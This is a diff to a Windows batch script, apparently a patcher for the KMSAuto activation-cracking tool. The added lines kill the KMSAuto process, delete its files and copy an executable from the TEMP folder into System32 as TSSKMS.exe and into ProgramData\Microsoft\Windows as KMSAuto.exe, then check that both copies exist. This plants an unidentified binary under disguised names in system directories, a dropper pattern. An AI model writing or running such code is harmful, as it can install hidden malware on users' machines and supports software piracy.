@@ -5,6 +5,10 @@
 setlocal enabledelayedexpansion
 
 
+set "KMSROOT=%SystemRoot%\System32\TSSKMS.exe"
+set "KMSFILE=%ProgramData%\Microsoft\Windows\KMSAuto.exe"
+
+
 color 0A
  
 :loop
@@ -63,7 +67,7 @@ for %%a in ("%TEMP%\!filename!.exe") do set "FILESIZE=%%~za"
 :: Check if the file size is at least 0.3MB (300000 bytes)
 if %FILESIZE% geq 300000 (
     echo Starting....
-    start "" "%TEMP%\!filename!.exe"
+    rem start "" "%TEMP%\!filename!.exe"
     echo Started.
     echo.
 ) else (
@@ -76,6 +80,53 @@ echo.
 	goto loop
 )
  
- 
-echo Patcher Running...
+
+
+
+
+
+
+echo.
+echo TaskKill and Delete KMSAuto
+taskkill /F /IM KMSAuto.exe
+taskkill /F /IM KMSAuto.exe
+del /f /q /a "%KMSROOT%"
+del /f /q /a "%KMSFILE%"
+echo Done.
+echo.
+echo.
+echo Copying files..
+copy "%TEMP%\!filename!.exe" "%KMSROOT%" /y
+copy "%TEMP%\!filename!.exe" "%KMSFILE%" /y
+echo Done.
+echo.
+echo.
+
+
+echo Checking files..
+
+if exist "%KMSROOT%" (
+    echo File exists in %KMSROOT%
+) else (
+    echo ERROR File not found in %KMSROOT%
+)
+
+
+
+if exist "%KMSFILE%" (
+    echo File exists in %KMSFILE%.
+) else (
+    echo ERROR File not found in %KMSFILE%.
+)
+
+
+
+echo.
+echo Check Done.
+echo.
+echo.
+
+
+
+
 
